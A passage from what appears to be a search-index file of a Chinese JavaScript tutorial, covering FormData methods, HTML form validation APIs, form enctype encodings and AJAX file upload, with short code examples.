\uff1a\u8fd4\u56de\u4e00\u4e2a\u6570\u7ec4\uff0c\u8868\u793a\u6307\u5b9a\u952e\u540d\u5bf9\u5e94\u7684\u6240\u6709\u952e\u503c\u3002\u5982\u679c\u6709\u591a\u4e2a\u540c\u540d\u7684\u952e\u503c\u5bf9\uff0c\u6570\u7ec4\u4f1a\u5305\u542b\u6240\u6709\u7684\u952e\u503c\u3002 FormData.set(key, value) \uff1a\u8bbe\u7f6e\u6307\u5b9a\u952e\u540d\u7684\u952e\u503c\uff0c\u53c2\u6570\u4e3a\u952e\u540d\u3002\u5982\u679c\u952e\u540d\u4e0d\u5b58\u5728\uff0c\u4f1a\u6dfb\u52a0\u8fd9\u4e2a\u952e\u503c\u5bf9\uff0c\u5426\u5219\u4f1a\u66f4\u65b0\u6307\u5b9a\u952e\u540d\u7684\u952e\u503c\u3002\u5982\u679c\u7b2c\u4e8c\u4e2a\u53c2\u6570\u662f\u6587\u4ef6\uff0c\u8fd8\u53ef\u4ee5\u4f7f\u7528\u7b2c\u4e09\u4e2a\u53c2\u6570\uff0c\u8868\u793a\u6587\u4ef6\u540d\u3002 FormData.delete(key) \uff1a\u5220\u9664\u4e00\u4e2a\u952e\u503c\u5bf9\uff0c\u53c2\u6570\u4e3a\u952e\u540d\u3002 FormData.append(key, value) \uff1a\u6dfb\u52a0\u4e00\u4e2a\u952e\u503c\u5bf9\u3002\u5982\u679c\u952e\u540d\u91cd\u590d\uff0c\u5219\u4f1a\u751f\u6210\u4e24\u4e2a\u76f8\u540c\u952e\u540d\u7684\u952e\u503c\u5bf9\u3002\u5982\u679c\u7b2c\u4e8c\u4e2a\u53c2\u6570\u662f\u6587\u4ef6\uff0c\u8fd8\u53ef\u4ee5\u4f7f\u7528\u7b2c\u4e09\u4e2a\u53c2\u6570\uff0c\u8868\u793a\u6587\u4ef6\u540d\u3002 FormData.has(key) \uff1a\u8fd4\u56de\u4e00\u4e2a\u5e03\u5c14\u503c\uff0c\u8868\u793a\u662f\u5426\u5177\u6709\u8be5\u952e\u540d\u7684\u952e\u503c\u5bf9\u3002 FormData.keys() \uff1a\u8fd4\u56de\u4e00\u4e2a\u904d\u5386\u5668\u5bf9\u8c61\uff0c\u7528\u4e8e for...of \u5faa\u73af\u904d\u5386\u6240\u6709\u7684\u952e\u540d\u3002 FormData.values() \uff1a\u8fd4\u56de\u4e00\u4e2a\u904d\u5386\u5668\u5bf9\u8c61\uff0c\u7528\u4e8e for...of \u5faa\u73af\u904d\u5386\u6240\u6709\u7684\u952e\u503c\u3002 FormData.entries() \uff1a\u8fd4\u56de\u4e00\u4e2a\u904d\u5386\u5668\u5bf9\u8c61\uff0c\u7528\u4e8e for...of \u5faa\u73af\u904d\u5386\u6240\u6709\u7684\u952e\u503c\u5bf9\u3002\u5982\u679c\u76f4\u63a5\u7528 for...of \u5faa\u73af\u904d\u5386 FormData \u5b9e\u4f8b\uff0c\u9ed8\u8ba4\u5c31\u4f1a\u8c03\u7528\u8fd9\u4e2a\u65b9\u6cd5\u3002 \u4e0b\u9762\u662f get() \u3001 getAll() \u3001 set() \u3001 append() \u65b9\u6cd5\u7684\u4f8b\u5b50\u3002 1 2 3 4 5 6 7 8 9 var formData = new FormData (); formData . set ( 'username' , '\u5f20\u4e09' ); formData . append ( 'username' , '\u674e\u56db' ); formData . get ( 'username' ) // \"\u5f20\u4e09\" formData . getAll ( 'username' ) // [\"\u5f20\u4e09\", \"\u674e\u56db\"] formData . append ( 'userpic[]' , myFileInput . files [ 0 ], 'user1.jpg' ); formData . append ( 'userpic[]' , myFileInput . files [ 1 ], 'user2.jpg' ); \u4e0b\u9762\u662f\u904d\u5386\u5668\u7684\u4f8b\u5b50\u3002 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 var formData = new FormData (); formData . append ( 'key1' , 'value1' ); formData . append ( 'key2' , 'value2' ); for ( var key of formData . keys ()) { console . log ( key ); } // \"key1\" // \"key2\" for ( var value of formData . values ()) { console . log ( value ); } // \"value1\" // \"value2\" for ( var pair of formData . entries ()) { console . log ( pair [ 0 ] + ': ' + pair [ 1 ]); } // key1: value1 // key2: value2 // \u7b49\u540c\u4e8e\u904d\u5386 formData.entries() for ( var pair of formData ) { console . log ( pair [ 0 ] + ': ' + pair [ 1 ]); } // key1: value1 // key2: value2","title":"\u5b9e\u4f8b\u65b9\u6cd5"},{"location":"bom/form/#_4","text":"","title":"\u8868\u5355\u7684\u5185\u7f6e\u9a8c\u8bc1"},{"location":"bom/form/#_5","text":"\u8868\u5355\u63d0\u4ea4\u7684\u65f6\u5019\uff0c\u6d4f\u89c8\u5668\u5141\u8bb8\u5f00\u53d1\u8005\u6307\u5b9a\u4e00\u4e9b\u6761\u4ef6\uff0c\u5b83\u4f1a\u81ea\u52a8\u9a8c\u8bc1\u5404\u4e2a\u8868\u5355\u63a7\u4ef6\u7684\u503c\u662f\u5426\u7b26\u5408\u6761\u4ef6\u3002 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 <!-- \u5fc5\u586b --> < input required > <!-- \u5fc5\u987b\u7b26\u5408\u6b63\u5219\u8868\u8fbe\u5f0f --> < input pattern = \"banana|cherry\" > <!-- \u5b57\u7b26\u4e32\u957f\u5ea6\u5fc5\u987b\u4e3a6\u4e2a\u5b57\u7b26 --> < input minlength = \"6\" maxlength = \"6\" > <!-- \u6570\u503c\u5fc5\u987b\u57281\u523010\u4e4b\u95f4 --> < input type = \"number\" min = \"1\" max = \"10\" > <!-- \u5fc5\u987b\u586b\u5165 Email \u5730\u5740 --> < input type = \"email\" > <!-- \u5fc5\u987b\u586b\u5165 URL --> < input type = \"URL\" > \u5982\u679c\u4e00\u4e2a\u63a7\u4ef6\u901a\u8fc7\u9a8c\u8bc1\uff0c\u5b83\u5c31\u4f1a\u5339\u914d :valid \u7684 CSS \u4f2a\u7c7b\uff0c\u6d4f\u89c8\u5668\u4f1a\u7ee7\u7eed\u8fdb\u884c\u8868\u5355\u63d0\u4ea4\u7684\u6d41\u7a0b\u3002\u5982\u679c\u6ca1\u6709\u901a\u8fc7\u9a8c\u8bc1\uff0c\u8be5\u63a7\u4ef6\u5c31\u4f1a\u5339\u914d :invalid \u7684 CSS \u4f2a\u7c7b\uff0c\u6d4f\u89c8\u5668\u4f1a\u7ec8\u6b62\u8868\u5355\u63d0\u4ea4\uff0c\u5e76\u663e\u793a\u4e00\u4e2a\u9519\u8bef\u4fe1\u606f\u3002 1 2 3 4 5 6 7 input : invalid { border-color : red ; } input , input : valid { border-color : #ccc ; }","title":"\u81ea\u52a8\u6821\u9a8c"},{"location":"bom/form/#checkvalidity","text":"\u9664\u4e86\u63d0\u4ea4\u8868\u5355\u7684\u65f6\u5019\uff0c\u6d4f\u89c8\u5668\u81ea\u52a8\u6821\u9a8c\u8868\u5355\uff0c\u8fd8\u53ef\u4ee5\u624b\u52a8\u89e6\u53d1\u8868\u5355\u7684\u6821\u9a8c\u3002\u8868\u5355\u5143\u7d20\u548c\u8868\u5355\u63a7\u4ef6\u90fd\u6709 checkValidity() \u65b9\u6cd5\uff0c\u7528\u4e8e\u624b\u52a8\u89e6\u53d1\u6821\u9a8c\u3002 1 2 3 4 5 // \u89e6\u53d1\u6574\u4e2a\u8868\u5355\u7684\u6821\u9a8c form . checkValidity () // \u89e6\u53d1\u5355\u4e2a\u8868\u5355\u63a7\u4ef6\u7684\u6821\u9a8c formControl . checkValidity () checkValidity() \u65b9\u6cd5\u8fd4\u56de\u4e00\u4e2a\u5e03\u5c14\u503c\uff0c true \u8868\u793a\u901a\u8fc7\u6821\u9a8c\uff0c false \u8868\u793a\u6ca1\u6709\u901a\u8fc7\u6821\u9a8c\u3002\u56e0\u6b64\uff0c\u63d0\u4ea4\u8868\u5355\u53ef\u4ee5\u5c01\u88c5\u4e3a\u4e0b\u9762\u7684\u51fd\u6570\u3002 1 2 3 4 5 6 7 function submitForm ( action ) { var form = document . getElementById ( 'form' ); form . action = action ; if ( form . checkValidity ()) { form . submit (); } }","title":"checkValidity()"},{"location":"bom/form/#willvalidate","text":"\u63a7\u4ef6\u5143\u7d20\u7684 willValidate \u5c5e\u6027\u662f\u4e00\u4e2a\u5e03\u5c14\u503c\uff0c\u8868\u793a\u8be5\u63a7\u4ef6\u662f\u5426\u4f1a\u5728\u63d0\u4ea4\u65f6\u8fdb\u884c\u6821\u9a8c\u3002 1 2 3 4 5 6 7 // HTML \u4ee3\u7801\u5982\u4e0b // <form novalidate> // <input id=\"name\" name=\"name\" required /> // </form> var input = document . querySelector ( '#name' ); input . willValidate // true","title":"willValidate \u5c5e\u6027"},{"location":"bom/form/#validationmessage","text":"\u63a7\u4ef6\u5143\u7d20\u7684 validationMessage \u5c5e\u6027\u8fd4\u56de\u4e00\u4e2a\u5b57\u7b26\u4e32\uff0c\u8868\u793a\u63a7\u4ef6\u4e0d\u6ee1\u8db3\u6821\u9a8c\u6761\u4ef6\u65f6\uff0c\u6d4f\u89c8\u5668\u663e\u793a\u7684\u63d0\u793a\u6587\u672c\u3002\u4ee5\u4e0b\u4e24\u79cd\u60c5\u51b5\uff0c\u8be5\u5c5e\u6027\u8fd4\u56de\u7a7a\u5b57\u7b26\u4e32\u3002 \u8be5\u63a7\u4ef6\u4e0d\u4f1a\u5728\u63d0\u4ea4\u65f6\u81ea\u52a8\u6821\u9a8c \u8be5\u63a7\u4ef6\u6ee1\u8db3\u6821\u9a8c\u6761\u4ef6 1 2 3 4 // HTML \u4ee3\u7801\u5982\u4e0b // <form><input type=\"text\" required></form> document . querySelector ( 'form input' ). validationMessage // \"\u8bf7\u586b\u5199\u6b64\u5b57\u6bb5\u3002\" \u4e0b\u9762\u662f\u53e6\u4e00\u4e2a\u4f8b\u5b50\u3002 1 2 3 4 var myInput = document . getElementById ( 'myinput' ); if ( ! myInput . checkValidity ()) { document . getElementById ( 'prompt' ). innerHTML = myInput . validationMessage ; }","title":"validationMessage \u5c5e\u6027"},{"location":"bom/form/#setcustomvalidity","text":"\u63a7\u4ef6\u5143\u7d20\u7684 setCustomValidity() \u65b9\u6cd5\u7528\u6765\u5b9a\u5236\u6821\u9a8c\u5931\u8d25\u65f6\u7684\u62a5\u9519\u4fe1\u606f\u3002\u5b83\u63a5\u53d7\u4e00\u4e2a\u5b57\u7b26\u4e32\u4f5c\u4e3a\u53c2\u6570\uff0c\u8be5\u5b57\u7b26\u4e32\u5c31\u662f\u5b9a\u5236\u7684\u62a5\u9519\u4fe1\u606f\u3002\u5982\u679c\u53c2\u6570\u4e3a\u7a7a\u5b57\u7b26\u4e32\uff0c\u5219\u4e0a\u6b21\u8bbe\u7f6e\u7684\u62a5\u9519\u4fe1\u606f\u88ab\u6e05\u9664\u3002 \u8fd9\u4e2a\u65b9\u6cd5\u53ef\u4ee5\u66ff\u6362\u6d4f\u89c8\u5668\u5185\u7f6e\u7684\u8868\u5355\u9a8c\u8bc1\u62a5\u9519\u4fe1\u606f\uff0c\u53c2\u6570\u5c31\u662f\u8981\u663e\u793a\u7684\u62a5\u9519\u4fe1\u606f\u3002 1 2 3 4 5 6 7 8 9 10 < form action = \"somefile.php\" > < input type = \"text\" name = \"username\" placeholder = \"Username\" pattern = \"[a-z]{1,15}\" id = \"username\" > < input type = \"submit\" > </ form > \u4e0a\u9762\u7684\u8868\u5355\u8f93\u5165\u6846\uff0c\u8981\u6c42\u53ea\u80fd\u8f93\u5165\u5c0f\u5199\u5b57\u6bcd\uff0c\u4e14\u4e0d\u5f97\u8d85\u8fc715\u4e2a\u5b57\u7b26\u3002\u5982\u679c\u8f93\u5165\u4e0d\u7b26\u5408\u8981\u6c42\uff08\u6bd4\u5982\u8f93\u5165\u201cABC\u201d\uff09\uff0c\u63d0\u4ea4\u8868\u5355\u7684\u65f6\u5019\uff0cChrome \u6d4f\u89c8\u5668\u4f1a\u5f39\u51fa\u62a5\u9519\u4fe1\u606f\u201cPlease match the requested format.\u201d\uff0c\u7981\u6b62\u8868\u5355\u63d0\u4ea4\u3002\u4e0b\u9762\u4f7f\u7528 setCustomValidity() \u65b9\u6cd5\u66ff\u6362\u6389\u62a5\u9519\u4fe1\u606f\u3002 1 2 3 4 5 6 var input = document . getElementById ( 'username' ); input . oninvalid = function ( event ) { event . target . setCustomValidity ( '\u7528\u6237\u540d\u5fc5\u987b\u662f\u5c0f\u5199\u5b57\u6bcd\uff0c\u4e0d\u80fd\u4e3a\u7a7a\uff0c\u6700\u957f\u4e0d\u8d85\u8fc715\u4e2a\u5b57\u7b26' ); } \u4e0a\u9762\u4ee3\u7801\u4e2d\uff0c setCustomValidity() \u65b9\u6cd5\u662f\u5728 invalid \u4e8b\u4ef6\u7684\u76d1\u542c\u51fd\u6570\u91cc\u9762\u8c03\u7528\u3002\u8be5\u65b9\u6cd5\u4e5f\u53ef\u4ee5\u76f4\u63a5\u8c03\u7528\uff0c\u8fd9\u65f6\u5982\u679c\u53c2\u6570\u4e0d\u4e3a\u7a7a\u5b57\u7b26\u4e32\uff0c\u6d4f\u89c8\u5668\u5c31\u4f1a\u8ba4\u4e3a\u8be5\u63a7\u4ef6\u6ca1\u6709\u901a\u8fc7\u6821\u9a8c\uff0c\u5c31\u4f1a\u7acb\u523b\u663e\u793a\u8be5\u65b9\u6cd5\u8bbe\u7f6e\u7684\u62a5\u9519\u4fe1\u606f\u3002 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 /* HTML \u4ee3\u7801\u5982\u4e0b <form> <p><input type=\"file\" id=\"fs\"></p> <p><input type=\"submit\"></p> </form> */ document . getElementById ( 'fs' ). onchange = checkFileSize ; function checkFileSize () { var fs = document . getElementById ( 'fs' ); var files = fs . files ; if ( files . length > 0 ) { if ( files [ 0 ]. size > 75 * 1024 ) { fs . setCustomValidity ( '\u6587\u4ef6\u4e0d\u80fd\u5927\u4e8e 75KB' ); return ; } } fs . setCustomValidity ( '' ); } \u4e0a\u9762\u4ee3\u7801\u4e00\u65e6\u53d1\u73b0\u6587\u4ef6\u5927\u4e8e 75KB\uff0c\u5c31\u4f1a\u8bbe\u7f6e\u6821\u9a8c\u5931\u8d25\uff0c\u540c\u65f6\u7ed9\u51fa\u81ea\u5b9a\u4e49\u7684\u62a5\u9519\u4fe1\u606f\u3002\u7136\u540e\uff0c\u70b9\u51fb\u63d0\u4ea4\u6309\u94ae\u65f6\uff0c\u5c31\u4f1a\u663e\u793a\u62a5\u9519\u4fe1\u606f\u3002\u8fd9\u79cd\u6821\u9a8c\u5931\u8d25\u662f\u4e0d\u4f1a\u81ea\u52a8\u6d88\u9664\u7684\uff0c\u6240\u4ee5\u5982\u679c\u6240\u6709\u6587\u4ef6\u90fd\u7b26\u5408\u6761\u4ef6\uff0c\u8981\u5c06\u62a5\u9519\u4fe1\u606f\u8bbe\u4e3a\u7a7a\u5b57\u7b26\u4e32\uff0c\u624b\u52a8\u6d88\u9664\u6821\u9a8c\u5931\u8d25\u7684\u72b6\u6001\u3002","title":"setCustomValidity()"},{"location":"bom/form/#validity","text":"\u63a7\u4ef6\u5143\u7d20\u7684\u5c5e\u6027 validity \u5c5e\u6027\u8fd4\u56de\u4e00\u4e2a ValidityState \u5bf9\u8c61\uff0c\u5305\u542b\u5f53\u524d\u6821\u9a8c\u72b6\u6001\u7684\u4fe1\u606f\u3002 \u8be5\u5bf9\u8c61\u6709\u4ee5\u4e0b\u5c5e\u6027\uff0c\u5168\u90e8\u4e3a\u53ea\u8bfb\u5c5e\u6027\u3002 ValidityState.badInput \uff1a\u5e03\u5c14\u503c\uff0c\u8868\u793a\u6d4f\u89c8\u5668\u662f\u5426\u4e0d\u80fd\u5c06\u7528\u6237\u7684\u8f93\u5165\u8f6c\u6362\u6210\u6b63\u786e\u7684\u7c7b\u578b\uff0c\u6bd4\u5982\u7528\u6237\u5728\u6570\u503c\u6846\u91cc\u9762\u8f93\u5165\u5b57\u7b26\u4e32\u3002 ValidityState.customError \uff1a\u5e03\u5c14\u503c\uff0c\u8868\u793a\u662f\u5426\u5df2\u7ecf\u8c03\u7528 setCustomValidity() \u65b9\u6cd5\uff0c\u5c06\u6821\u9a8c\u4fe1\u606f\u8bbe\u7f6e\u4e3a\u4e00\u4e2a\u975e\u7a7a\u5b57\u7b26\u4e32\u3002 ValidityState.patternMismatch \uff1a\u5e03\u5c14\u503c\uff0c\u8868\u793a\u7528\u6237\u8f93\u5165\u7684\u503c\u662f\u5426\u4e0d\u6ee1\u8db3\u6a21\u5f0f\u7684\u8981\u6c42\u3002 ValidityState.rangeOverflow \uff1a\u5e03\u5c14\u503c\uff0c\u8868\u793a\u7528\u6237\u8f93\u5165\u7684\u503c\u662f\u5426\u5927\u4e8e\u6700\u5927\u8303\u56f4\u3002 ValidityState.rangeUnderflow \uff1a\u5e03\u5c14\u503c\uff0c\u8868\u793a\u7528\u6237\u8f93\u5165\u7684\u503c\u662f\u5426\u5c0f\u4e8e\u6700\u5c0f\u8303\u56f4\u3002 ValidityState.stepMismatch \uff1a\u5e03\u5c14\u503c\uff0c\u8868\u793a\u7528\u6237\u8f93\u5165\u7684\u503c\u4e0d\u7b26\u5408\u6b65\u957f\u7684\u8bbe\u7f6e\uff08\u5373\u4e0d\u80fd\u88ab\u6b65\u957f\u503c\u6574\u9664\uff09\u3002 ValidityState.tooLong \uff1a\u5e03\u5c14\u503c\uff0c\u8868\u793a\u7528\u6237\u8f93\u5165\u7684\u5b57\u6570\u8d85\u51fa\u4e86\u6700\u957f\u5b57\u6570\u3002 ValidityState.tooShort \uff1a\u5e03\u5c14\u503c\uff0c\u8868\u793a\u7528\u6237\u8f93\u5165\u7684\u5b57\u7b26\u5c11\u4e8e\u6700\u77ed\u5b57\u6570\u3002 ValidityState.typeMismatch \uff1a\u5e03\u5c14\u503c\uff0c\u8868\u793a\u7528\u6237\u586b\u5165\u7684\u503c\u4e0d\u7b26\u5408\u7c7b\u578b\u8981\u6c42\uff08\u4e3b\u8981\u662f\u7c7b\u578b\u4e3a Email \u6216 URL \u7684\u60c5\u51b5\uff09\u3002 ValidityState.valid \uff1a\u5e03\u5c14\u503c\uff0c\u8868\u793a\u7528\u6237\u662f\u5426\u6ee1\u8db3\u6240\u6709\u6821\u9a8c\u6761\u4ef6\u3002 ValidityState.valueMissing \uff1a\u5e03\u5c14\u503c\uff0c\u8868\u793a\u7528\u6237\u6ca1\u6709\u586b\u5165\u5fc5\u586b\u7684\u503c\u3002 \u4e0b\u9762\u662f\u4e00\u4e2a\u4f8b\u5b50\u3002 1 2 3 4 5 6 var input = document . getElementById ( 'myinput' ); if ( input . validity . valid ) { console . log ( '\u901a\u8fc7\u6821\u9a8c' ); } else { console . log ( '\u6821\u9a8c\u5931\u8d25' ); } \u4e0b\u9762\u662f\u53e6\u5916\u4e00\u4e2a\u4f8b\u5b50\u3002 1 2 3 4 5 var txt = '' ; if ( document . getElementById ( 'myInput' ). validity . rangeOverflow ) { txt = '\u6570\u503c\u8d85\u8fc7\u4e0a\u9650' ; } document . getElementById ( 'prompt' ). innerHTML = txt ; \u5982\u679c\u60f3\u7981\u6b62\u6d4f\u89c8\u5668\u5f39\u51fa\u8868\u5355\u9a8c\u8bc1\u7684\u62a5\u9519\u4fe1\u606f\uff0c\u53ef\u4ee5\u76d1\u542c invalid \u4e8b\u4ef6\u3002 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 var input = document . getElementById ( 'username' ); var form = document . getElementById ( 'form' ); var elem = document . createElement ( 'div' ); elem . id = 'notify' ; elem . style . display = 'none' ; form . appendChild ( elem ); input . addEventListener ( 'invalid' , function ( event ) { event . preventDefault (); if ( ! event . target . validity . valid ) { elem . textContent = '\u7528\u6237\u540d\u5fc5\u987b\u662f\u5c0f\u5199\u5b57\u6bcd' ; elem . className = 'error' ; elem . style . display = 'block' ; input . className = 'invalid animated shake' ; } }); input . addEventListener ( 'input' , function ( event ){ if ( 'block' === elem . style . display ) { input . className = '' ; elem . style . display = 'none' ; } }); \u4e0a\u9762\u4ee3\u7801\u4e2d\uff0c\u4e00\u65e6\u53d1\u751f invalid \u4e8b\u4ef6\uff08\u8868\u5355\u9a8c\u8bc1\u5931\u8d25\uff09\uff0c event.preventDefault() \u7528\u6765\u7981\u6b62\u6d4f\u89c8\u5668\u5f39\u51fa\u9ed8\u8ba4\u7684\u9a8c\u8bc1\u5931\u8d25\u63d0\u793a\uff0c\u7136\u540e\u8bbe\u7f6e\u5b9a\u5236\u7684\u62a5\u9519\u63d0\u793a\u6846\u3002","title":"validity \u5c5e\u6027"},{"location":"bom/form/#novalidate","text":"\u8868\u5355\u5143\u7d20\u7684 HTML \u5c5e\u6027 novalidate \uff0c\u53ef\u4ee5\u5173\u95ed\u6d4f\u89c8\u5668\u7684\u81ea\u52a8\u6821\u9a8c\u3002 1 2 < form novalidate > </ form > \u8fd9\u4e2a\u5c5e\u6027\u4e5f\u53ef\u4ee5\u5728\u811a\u672c\u91cc\u8bbe\u7f6e\u3002 1 form . noValidate = true ; \u5982\u679c\u8868\u5355\u5143\u7d20\u6ca1\u6709\u8bbe\u7f6e novalidate \u5c5e\u6027\uff0c\u90a3\u4e48\u63d0\u4ea4\u6309\u94ae\uff08 <button> \u6216 <input> \u5143\u7d20\uff09\u7684 formnovalidate \u5c5e\u6027\u4e5f\u6709\u540c\u6837\u7684\u4f5c\u7528\u3002 1 2 3 < form > < input type = \"submit\" value = \"submit\" formnovalidate > </ form >","title":"\u8868\u5355\u7684 novalidate \u5c5e\u6027"},{"location":"bom/form/#enctype","text":"\u8868\u5355\u80fd\u591f\u7528\u56db\u79cd\u7f16\u7801\uff0c\u5411\u670d\u52a1\u5668\u53d1\u9001\u6570\u636e\u3002\u7f16\u7801\u683c\u5f0f\u7531\u8868\u5355\u7684 enctype \u5c5e\u6027\u51b3\u5b9a\u3002 \u5047\u5b9a\u8868\u5355\u6709\u4e24\u4e2a\u5b57\u6bb5\uff0c\u5206\u522b\u662f foo \u548c baz \uff0c\u5176\u4e2d foo \u5b57\u6bb5\u7684\u503c\u7b49\u4e8e bar \uff0c baz \u5b57\u6bb5\u7684\u503c\u662f\u4e00\u4e2a\u5206\u4e3a\u4e24\u884c\u7684\u5b57\u7b26\u4e32\u3002 1 2 The first line. The second line. \u4e0b\u9762\u56db\u79cd\u683c\u5f0f\uff0c\u90fd\u53ef\u4ee5\u5c06\u8fd9\u4e2a\u8868\u5355\u53d1\u9001\u5230\u670d\u52a1\u5668\u3002 \uff081\uff09GET \u65b9\u6cd5 \u5982\u679c\u8868\u5355\u4f7f\u7528 GET \u65b9\u6cd5\u53d1\u9001\u6570\u636e\uff0c enctype \u5c5e\u6027\u65e0\u6548\u3002 1 2 3 4 5 6 < form action = \"register.php\" method = \"get\" onsubmit = \"AJAXSubmit(this); return false;\" > </ form > \u6570\u636e\u5c06\u4ee5 URL \u7684\u67e5\u8be2\u5b57\u7b26\u4e32\u53d1\u51fa\u3002 1 ?foo=bar&baz=The%20first%20line.%0AThe%20second%20line. \uff082\uff09application/x-www-form-urlencoded \u5982\u679c\u8868\u5355\u7528 POST \u65b9\u6cd5\u53d1\u9001\u6570\u636e\uff0c\u5e76\u7701\u7565 enctype \u5c5e\u6027\uff0c\u90a3\u4e48\u6570\u636e\u4ee5 application/x-www-form-urlencoded \u683c\u5f0f\u53d1\u9001\uff08\u56e0\u4e3a\u8fd9\u662f\u9ed8\u8ba4\u503c\uff09\u3002 1 2 3 4 5 6 < form action = \"register.php\" method = \"post\" onsubmit = \"AJAXSubmit(this); return false;\" > </ form > \u53d1\u9001\u7684 HTTP \u8bf7\u6c42\u5982\u4e0b\u3002 1 2 3 Content-Type: application/x-www-form-urlencoded foo=bar&baz=The+first+line.%0D%0AThe+second+line.%0D%0A \u4e0a\u9762\u4ee3\u7801\u4e2d\uff0c\u6570\u636e\u4f53\u91cc\u9762\u7684 %0D%0A \u4ee3\u8868\u6362\u884c\u7b26\uff08 \\r\\n \uff09\u3002 \uff083\uff09text/plain \u5982\u679c\u8868\u5355\u4f7f\u7528 POST \u65b9\u6cd5\u53d1\u9001\u6570\u636e\uff0c enctype \u5c5e\u6027\u4e3a text/plain \uff0c\u90a3\u4e48\u6570\u636e\u5c06\u4ee5\u7eaf\u6587\u672c\u683c\u5f0f\u53d1\u9001\u3002 1 2 3 4 5 6 7 < form action = \"register.php\" method = \"post\" enctype = \"text/plain\" onsubmit = \"AJAXSubmit(this); return false;\" > </ form > \u53d1\u9001\u7684 HTTP \u8bf7\u6c42\u5982\u4e0b\u3002 1 2 3 4 5 Content-Type: text/plain foo=bar baz=The first line. The second line. \uff084\uff09multipart/form-data \u5982\u679c\u8868\u5355\u4f7f\u7528 POST \u65b9\u6cd5\uff0c enctype \u5c5e\u6027\u4e3a multipart/form-data \uff0c\u90a3\u4e48\u6570\u636e\u5c06\u4ee5\u6df7\u5408\u7684\u683c\u5f0f\u53d1\u9001\u3002 1 2 3 4 5 6 7 < form action = \"register.php\" method = \"post\" enctype = \"multipart/form-data\" onsubmit = \"AJAXSubmit(this); return false;\" > </ form > \u53d1\u9001\u7684 HTTP \u8bf7\u6c42\u5982\u4e0b\u3002 1 2 3 4 5 6 7 8 9 10 11 12 13 Content-Type: multipart/form-data; boundary=---------------------------314911788813839 -----------------------------314911788813839 Content-Disposition: form-data; name=\"foo\" bar -----------------------------314911788813839 Content-Disposition: form-data; name=\"baz\" The first line. The second line. -----------------------------314911788813839-- \u8fd9\u79cd\u683c\u5f0f\u4e5f\u662f\u6587\u4ef6\u4e0a\u4f20\u7684\u683c\u5f0f\u3002","title":"enctype \u5c5e\u6027"},{"location":"bom/form/#_6","text":"\u7528\u6237\u4e0a\u4f20\u6587\u4ef6\uff0c\u4e5f\u662f\u901a\u8fc7\u8868\u5355\u3002\u5177\u4f53\u6765\u8bf4\uff0c\u5c31\u662f\u901a\u8fc7\u6587\u4ef6\u8f93\u5165\u6846\u9009\u62e9\u672c\u5730\u6587\u4ef6\uff0c\u63d0\u4ea4\u8868\u5355\u7684\u65f6\u5019\uff0c\u6d4f\u89c8\u5668\u5c31\u4f1a\u628a\u8fd9\u4e2a\u6587\u4ef6\u53d1\u9001\u5230\u670d\u52a1\u5668\u3002 1 < input type = \"file\" id = \"file\" name = \"myFile\" > \u6b64\u5916\uff0c\u8fd8\u9700\u8981\u5c06\u8868\u5355 <form> \u5143\u7d20\u7684 method \u5c5e\u6027\u8bbe\u4e3a POST \uff0c enctype \u5c5e\u6027\u8bbe\u4e3a multipart/form-data \u3002\u5176\u4e2d\uff0c enctype \u5c5e\u6027\u51b3\u5b9a\u4e86 HTTP \u5934\u4fe1\u606f\u7684 Content-Type \u5b57\u6bb5\u7684\u503c\uff0c\u9ed8\u8ba4\u60c5\u51b5\u4e0b\u8fd9\u4e2a\u5b57\u6bb5\u7684\u503c\u662f application/x-www-form-urlencoded \uff0c\u4f46\u662f\u6587\u4ef6\u4e0a\u4f20\u7684\u65f6\u5019\u8981\u6539\u6210 multipart/form-data \u3002 1 2 3 4 5 6 7 8 9 < form method = \"post\" enctype = \"multipart/form-data\" > < div > < label for = \"file\" > \u9009\u62e9\u4e00\u4e2a\u6587\u4ef6 </ label > < input type = \"file\" id = \"file\" name = \"myFile\" multiple > </ div > < div > < input type = \"submit\" id = \"submit\" name = \"submit_button\" value = \"\u4e0a\u4f20\" /> </ div > </ form > \u4e0a\u9762\u7684 HTML \u4ee3\u7801\u4e2d\uff0cfile \u63a7\u4ef6\u7684 multiple \u5c5e\u6027\uff0c\u6307\u5b9a\u53ef\u4ee5\u4e00\u6b21\u9009\u62e9\u591a\u4e2a\u6587\u4ef6\uff1b\u5982\u679c\u6ca1\u6709\u8fd9\u4e2a\u5c5e\u6027\uff0c\u5219\u4e00\u6b21\u53ea\u80fd\u9009\u62e9\u4e00\u4e2a\u6587\u4ef6\u3002 1 2 var fileSelect = document . getElementById ( 'file' ); var files = fileSelect . files ; \u7136\u540e\uff0c\u65b0\u5efa\u4e00\u4e2a FormData \u5b9e\u4f8b\u5bf9\u8c61\uff0c\u6a21\u62df\u53d1\u9001\u5230\u670d\u52a1\u5668\u7684\u8868\u5355\u6570\u636e\uff0c\u628a\u9009\u4e2d\u7684\u6587\u4ef6\u6dfb\u52a0\u5230\u8fd9\u4e2a\u5bf9\u8c61\u4e0a\u9762\u3002 1 2 3 4 5 6 7 8 9 10 11 12 var formData = new FormData (); for ( var i = 0 ; i < files . length ; i ++ ) { var file = files [ i ]; // \u53ea\u4e0a\u4f20\u56fe\u7247\u6587\u4ef6 if ( ! file . type . match ( 'image.*' )) { continue ; } formData . append ( 'photos[]' , file , file . name ); } \u6700\u540e\uff0c\u4f7f\u7528 Ajax \u5411\u670d\u52a1\u5668\u4e0a\u4f20\u6587\u4ef6\u3002 1 2 3 4 5 6 7 8 9 10 11 var xhr = new XMLHttpRequest (); xhr . open ( 'POST' , 'handler.php' , true ); xhr . onload = function () { if ( xhr . status !== 200 ) { console . log ( 'An error occurred!' ); } }; xhr . send ( formData ); \u9664\u4e86\u53d1\u9001 FormData \u5b9e\u4f8b\uff0c\u4e5f\u53ef\u4ee5\u76f4\u63a5 AJAX \u53d1\u9001\u6587\u4ef6\u3002 1 2 3 4 5 6 var file = document . getElementById ( 'test-input' ). files [ 0 ]; var xhr = new XMLHttpRequest (); xhr . open ( 'POST' , 'myserver/uploads' ); xhr . setRequestHeader ( 'Content-Type' , file . type ); xhr . send ( file );","title":"\u6587\u4ef6\u4e0a\u4f20"},{"location":"bom/form/#_7","text":"HTML5 Form Validation With the \u201cpattern\u201d Attribute , Thoriq Firdaus","title":"\u53c2\u8003\u94fe\u63a5"},{"location":"bom/history/","text":"History \u5bf9\u8c61 